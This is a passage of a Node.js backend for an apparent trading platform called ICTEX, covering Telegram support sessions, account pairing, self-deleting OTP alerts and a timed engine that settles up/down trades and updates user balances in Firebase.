                                    await sendTelegramMessage(chatId, `❌ *Error fetching your accounts.* Please try again later.`);
                                }
                            }
                            else if (textLower === '/help') {
                                if (activeSupportSessions[chatId]) {
                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nYou are already in an active support session. Describe your query or close it using /endhelp.`);
                                    continue;
                                }
                                activeSupportSessions[chatId] = { active: true, isFirstMessage: true };
                                await sendTelegramMessage(chatId, `💬 *ICTEX Help Desk Started*\n\nYou are now connected to the Support Desk. Please describe your problem in detail, and our support agents will assist you shortly.\n\n*Supported languages:* Bangla, English, Urdu, Hindi, Arabic, Chinese, Japanese, and others.\n\n🔒 _Once your issue is resolved, tap /endhelp to close the session._`);
                            }
                            else if (textLower === '/endhelp' || textLower === '/end' || textLower === '/endhlp') {
                                if (activeSupportSessions[chatId]) {
                                    delete activeSupportSessions[chatId];
                                    await sendTelegramMessage(chatId, `🔒 *SUPPORT SESSION CLOSED*\n\nYour support session has been closed successfully. Standard gateway commands are now unlocked.\n\n🔑 /linkictex - Start Account Pairing\n👤 /accounts - View Linked Profiles\n💬 /help - Open New Help Session`);
                                } else {
                                    await sendTelegramMessage(chatId, `✨ *ICTEX Gateway Core* ✨\n\nNo active support session was found. Use the commands below:\n\n🔑 /linkictex - Link account securely\n👤 /accounts - Connected profiles\n💬 /help - Start live help support`);
                                }
                            }
                            else {
                                // সাপোর্ট সেশন সক্রিয় থাকলে মেসেজ ফরওয়ার্ড এবং অটো-রিপ্লাই প্রসেস করা
                                if (activeSupportSessions[chatId] && activeSupportSessions[chatId].active) {
                                    if (activeSupportSessions[chatId].isFirstMessage) {
                                        activeSupportSessions[chatId].isFirstMessage = false;
                                        
                                        // বাংলিশ ও হিংলিশ সহ মাল্টি-ল্যাঙ্গুয়েজ ডিটেকশন লজিক
                                        const isBangla = /(amar|shomosha|hoice|koro|hobe|ami|keno|bhalo|bhlo|din|dite|parben|korte|সমস্যা|সাহায্য|আইডি|হয়েছে)/i.test(text);
                                        const isHindi = /(pe|ek|hua|hain|mera|problem|mujhe|kab|dikkat|hai|huya|मদদ|समस्या|हुआ)/i.test(text);
                                        
                                        if (isBangla) {
                                            await sendTelegramMessage(chatId, `অনুগ্রহ করে অপেক্ষা করুন, খুব দ্রুত আপনার সাথে যোগাযোগ করা হবে।`);
                                        } else if (isHindi) {
                                            await sendTelegramMessage(chatId, `कृपया प्रतीक्षा करें, जल्द ही आपसे संपर्क किया जाएगा।`);
                                        } else {
                                            await sendTelegramMessage(chatId, `Please wait, our support agents will contact you shortly.`);
                                        }
                                    }
                                    
                                    // ওনার অ্যাকাউন্টে মেসেজটি ফরওয়ার্ড করা
                                    const forwardedId = await forwardTelegramMessage(ADMIN_OWNER_ID, chatId, update.message.message_id);
                                    if (forwardedId) {
                                        adminSupportMap[forwardedId] = chatId; // ট্র্যাকিং ম্যাপে রাখা
                                    }
                                }
                                else {
                                    // ওটিপি লিংক প্রসেস সক্রিয় থাকলে কোড ভেরিফাই করা
                                    const session = activeLinkingSessions[chatId];
                                    if (session && Date.now() < session.expiresAt) {
                                        const codeMatch = text.match(/[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}/);
                                        if (codeMatch) {
                                            const linkCode = codeMatch[0].toUpperCase();
                                            const linkSnap = await db.ref(`telegram_links/${linkCode}`).once('value');
                                            if (linkSnap.exists()) {
                                                const uid = linkSnap.val().uid;
                                                await db.ref(`users/${uid}`).update({
                                                    telegramChatId: chatId,
                                                    twoFactorEnabled: true
                                                });
                                                await linkSnap.ref.remove();
                                                
                                                clearTimeout(session.timeoutRef);
                                                if (session.linkMessageId) {
                                                    deleteTelegramMessage(chatId, session.linkMessageId);
                                                }
                                                delete activeLinkingSessions[chatId];
                                                
                                                await sendTelegramMessage(chatId, `🎉 *ACCOUNT PAIRED SUCCESSFULLY!* 🎉\n\nCongratulations! Your Telegram profile is now fully bound to your ICTEX Trading Account.\n\n🔒 *Security Features Enabled:*\n• 2FA Login Challenge Alerts\n• Real-Time Withdrawal OTP Alerts\n• Automated Terminal Re-authorizations\n\n_Your account is now guarded by our secure trading network._`);
                                            } else {
                                                await sendTelegramMessage(chatId, `❌ *PAIRING ATTEMPT FAILED* ❌\n\nThe linking code you provided is invalid, has expired, or has already been used.\n\n*What to do next:*\n1. Open your terminal settings.\n2. Generate a fresh 15-digit linking code.\n3. Type /linkictex to start a new pairing session, then paste the code instantly.`);
                                            }
                                        } else {
                                            await sendTelegramMessage(chatId, `❌ *Format Mismatch*\n\nThe code you entered does not match the 15-character linking code format (\`XXXXX - XXXXX - XXXXX\`). Please paste the code exactly as shown in your terminal.`);
                                        }
                                    } else {
                                        // সাধারণ পরিস্থিতিতে পাঠানো প্রিমিয়াম গাইড মেসেজ (Unsolicited Message Notice)
                                        await sendTelegramMessage(chatId, `ℹ️ *SYSTEM NOTICE: SUPPORT DESK INACTIVE*\n\nTo speak directly with our support agents, you must initialize a support session:\n\n💬 Tap /help to turn on live support chat.\n\n🔒 Once your conversation is completed, remember to close the session by tapping /endhelp.`);
                                    }
                                }
                            }
                        }
                    }
                }
            } catch(e) { console.error("Polling parse error:", e); }
            setTimeout(pollTelegramUpdates, 1000); 
        });
    }).on('error', (e) => {
        console.error("Polling connection error:", e);
        setTimeout(pollTelegramUpdates, 3000);
    });
}

function deleteTelegramWebhook() {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`;
    https.get(url, (res) => {
        res.resume(); // রেসপন্স ডেটা কনজিউম করে সকেট ফ্রি করা হলো
        console.log("Telegram webhook deleted for clean polling.");
        pollTelegramUpdates();
    }).on('error', (e) => {
        console.error("Error deleting webhook, starting polling anyway:", e);
        pollTelegramUpdates();
    });
}
deleteTelegramWebhook();

// Track active OTP transmissions for premium self-destruction
const activeOtps = {};

async function handleNewOtp(uid, chatId, otp, userName) {
    // নতুন ওটিপি পাঠানোর সময় আগের ওটিপি মেসেজটি থাকলে তা চ্যাট থেকে ডিলিট করে দেওয়া হবে
    if (activeOtps[uid]) {
        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
        if (activeOtps[uid].otpMessageId) {
            deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
        }
        delete activeOtps[uid];
    }

    const premiumOtpText = `🔐 *ICTEX VIP Security Alert*\n\nHello *${userName}*,\n\nYour secure verification code is:\n\n\`${otp.code}\`\n\n_This code will expire in 60 seconds. Do not share this transmission._`;
    
    const otpMessageId = await sendTelegramMessage(chatId, premiumOtpText);
    
    activeOtps[uid] = {
        code: otp.code,
        chatId,
        otpMessageId,
        expiresAt: otp.expiresAt
    };

    const duration = 60000;

    activeOtps[uid].timeoutRef = setTimeout(async () => {
        const expiredText = `⚠️ *Security Code Expired*\n\nThe verification code \`${otp.code}\` for *${userName}* has expired. Please request a new one from your terminal.`;
        const expiredMessageId = await sendTelegramMessage(chatId, expiredText);

        // ১০ সেকেন্ড পর ওটিপি মেসেজ এবং এক্সপায়ার নোটিফিকেশন দুটিই চ্যাট থেকে মুছে ফেলার টাইমার
        setTimeout(() => {
            if (otpMessageId) {
                deleteTelegramMessage(chatId, otpMessageId);
            }
            if (expiredMessageId) {
                deleteTelegramMessage(chatId, expiredMessageId);
            }
        }, 10000); 

        db.ref(`users/${uid}/pendingOTP`).remove().catch(() => {});
        delete activeOtps[uid];
    }, duration);
}

// Watch pendingOTP node creation across all users
db.ref('users').on('child_changed', (snapshot) => {
    const uid = snapshot.key;
    const user = snapshot.val();
    if (user && user.pendingOTP && user.telegramChatId) {
        const otp = user.pendingOTP;
        if (!activeOtps[uid] || activeOtps[uid].code !== otp.code) {
            handleNewOtp(uid, user.telegramChatId, otp, user.name || 'User');
        }
    } else if (user && !user.pendingOTP && activeOtps[uid]) {
        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
        if (activeOtps[uid].otpMessageId) {
            deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
        }
        delete activeOtps[uid];
    }
});

db.ref('users').on('child_added', (snapshot) => {
    const uid = snapshot.key;
    const user = snapshot.val();
    if (user && user.pendingOTP && user.telegramChatId) {
        const otp = user.pendingOTP;
        if (!activeOtps[uid] || activeOtps[uid].code !== otp.code) {
            handleNewOtp(uid, user.telegramChatId, otp, user.name || 'User');
        }
    }
});

// ==========================================
// 🔥 ULTIMATE ARBITER: Trade Resolution Engine 🔥
// ==========================================
setInterval(async () => {
    const now = Date.now();
    const allMarketUpdates = {};

    for (const marketId in markets) {
        const marketData = markets[marketId];
        const trades = activeTradesDb[marketId] || {};

        for (const tradeId in trades) {
            const trade = trades[tradeId];

            if (trade.expiryTimestamp && now >= trade.expiryTimestamp && now < trade.expiryTimestamp + 60000) {
                
                const historyCheckSnap = await db.ref(`users/${trade.uid}/tradeHistory/${trade.id}`).once('value');
                if (historyCheckSnap.exists()) {
                    if (!allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`]) allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                    if (!allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`]) allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
                    continue;
                }

                // Fix: Capture the exact live price at the moment the trade timer ends, 
                // rather than waiting for the entire candle to close, ensuring chart matches history perfectly.
                let closingPrice = marketData.currentPrice;

                if (closingPrice === null || typeof closingPrice !== 'number') continue;

                let result, payout, profitChange;
                const betAmount = parseFloat(trade.amount);
                const openPrice = parseFloat(trade.openPrice);
                const payoutRate = parseFloat(trade.payoutRate) || 1.85;

                const priceDifference = closingPrice - openPrice;
                const pricePrecision = MIN_PRICE / 10;

                if (Math.abs(priceDifference) < pricePrecision) {
                    result = 'push';
                    payout = betAmount;
                    profitChange = 0;
                } else if ((priceDifference > 0 && trade.direction === 'UP') || (priceDifference < 0 && trade.direction === 'DOWN')) {
                    result = 'win';
                    payout = betAmount * payoutRate;
                    profitChange = payout - betAmount;
                } else {
                    result = 'loss';
                    payout = 0;
                    profitChange = -betAmount;
                }
                
                const historyEntry = { ...trade, closePrice: closingPrice, result, payout };
                
                allMarketUpdates[`users/${trade.uid}/tradeHistory/${trade.id}`] = historyEntry;
                allMarketUpdates[`tradeResults/${trade.uid}/${trade.id}`] = { result, pnl: profitChange, amount: betAmount, market: trade.market };

                // Update balances for non-demo trades
                if (!trade.isDemo && !trade.isTournament) {
                    // ✅ Normal Trading uses Real/Bonus Wallet
                    if (result === 'win') {
                        allMarketUpdates[`users/${trade.uid}/realBalance`] = firebase.database.ServerValue.increment(payout);
                    } else if (result === 'push') {
                        allMarketUpdates[`users/${trade.uid}/realBalance`] = firebase.database.ServerValue.increment(trade.realAmount);
                        allMarketUpdates[`users/${trade.uid}/bonusBalance`] = firebase.database.ServerValue.increment(trade.bonusAmount);
                    }
                    allMarketUpdates[`users/${trade.uid}/totalProfitLoss`] = firebase.database.ServerValue.increment(profitChange);
                    allMarketUpdates[`users/${trade.uid}/dailyProfit`] = firebase.database.ServerValue.increment(profitChange);
                }

                // Cleanup active trades
                allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;

                console.log(`[ARBITER] Resolved trade ${tradeId} for user ${trade.uid}. Result: ${result}`);
            }
        }
    }

    if (Object.keys(allMarketUpdates).length > 0) {
        db.ref().update(allMarketUpdates).catch(e => console.error("Arbiter update failed:", e));
    }
}, 2000);

app.get('/ping', (_req, res) => res.send('Server V30.5 - Advanced Admin Engine'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));